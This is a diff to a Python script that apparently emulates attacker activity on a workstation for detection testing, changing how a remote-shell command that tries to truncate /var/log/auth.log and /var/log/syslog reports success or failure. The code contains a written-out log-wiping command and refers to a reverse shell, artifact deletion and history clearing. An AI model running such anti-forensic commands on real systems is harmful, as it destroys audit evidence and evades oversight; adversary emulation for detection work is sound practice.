@@ -209,18 +209,28 @@ def _workstation_delete_artifacts(john_shell):
 def _workstation_attempt_log_wipe(john_shell):
     """Attempt to truncate system logs as john.stravidis (T1070.001).
 
-    john has no write access to /var/log — the "Permission denied" errors
-    are observable events in the shell history and can trigger auditd alerts.
+    john has no write access to /var/log — the attempt fails and the failed
+    attempt is itself an observable event that can trigger auditd alerts.
+
+    Success/failure is detected from the redirection's exit status, echoed to
+    stdout as a marker, rather than by grepping the error text. The lateral
+    reverse shell that hands us this socket is launched with ``2>/dev/null``,
+    so the shell's "Permission denied" message for a failed ``>`` redirection
+    is swallowed and never reaches the capture buffer. Relying on the marker
+    keeps the result correct regardless of where stderr points.
     """
     log("[*] Attempting to truncate system logs (expect permission denied) ...")
     for log_path in ("/var/log/auth.log", "/var/log/syslog"):
-        out = _run_remote(john_shell, f"cat /dev/null > {log_path} 2>&1 || true")
-        if "Permission denied" in out or "permission denied" in out:
+        out = _run_remote(
+            john_shell,
+            f"if : > {log_path} 2>/dev/null; then echo WIPE_OK; else echo WIPE_DENIED; fi",
+        )
+        if "WIPE_DENIED" in out:
             log(f"[-] {log_path}: permission denied — failed attempt is itself detectable")
-        elif out:
-            log(f"[?] {log_path}: unexpected output ({out!r})")
-        else:
+        elif "WIPE_OK" in out:
             log(f"[+] {log_path}: truncated (unexpected — john should not have write access)")
+        else:
+            log(f"[?] {log_path}: indeterminate result ({out!r})")
 
 
 def _workstation_clear_history(john_shell):
